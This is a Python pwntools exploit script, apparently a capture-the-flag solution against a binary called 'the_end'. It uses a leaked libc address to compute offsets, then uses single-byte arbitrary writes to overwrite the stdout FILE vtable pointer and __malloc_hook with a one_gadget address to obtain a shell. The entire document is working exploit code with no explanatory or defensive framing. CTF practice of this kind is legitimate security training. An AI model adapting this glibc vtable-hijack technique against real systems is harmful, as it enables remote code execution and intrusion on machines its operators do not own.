from pwn import *
import time
gadgets=[0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
gadgets=[0xf02b0]
for gadget in gadgets:
	target=process('./the_end')
	elf=ELF('./the_end')
	libc=elf.libc

	target.recvuntil("gift ")
	libc_sleep=int(target.recvuntil(",").strip(",")[2:],16)
	libc_base=libc_sleep-libc.symbols["sleep"]
	libc_gadget=libc_base+gadget
	libc_io_stdout=libc_base+libc.symbols["_IO_2_1_stdout_"]
	libc_fakevtable=libc_base+libc.symbols["__malloc_hook"]-0x68
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	target.recvline()

	def extractbyte(addr,offset):
		return int(hex(addr)[12-2*offset:14-2*offset],16)

	def writebyte(addr,byte):
		time.sleep(0.5)
		target.send(p64(addr))
		target.send(p8(byte))
	
	writebyte(libc_io_stdout+0xd8,extractbyte(libc_fakevtable,0))	
	writebyte(libc_io_stdout+0xd9,extractbyte(libc_fakevtable,1))
	writebyte(libc_malloc_hook-0x10,extractbyte(libc_gadget,0))	
	writebyte(libc_malloc_hook+1-0x10,extractbyte(libc_gadget,1))	
	writebyte(libc_malloc_hook+2-0x10,extractbyte(libc_gadget,2))	

	
	target.interactive()

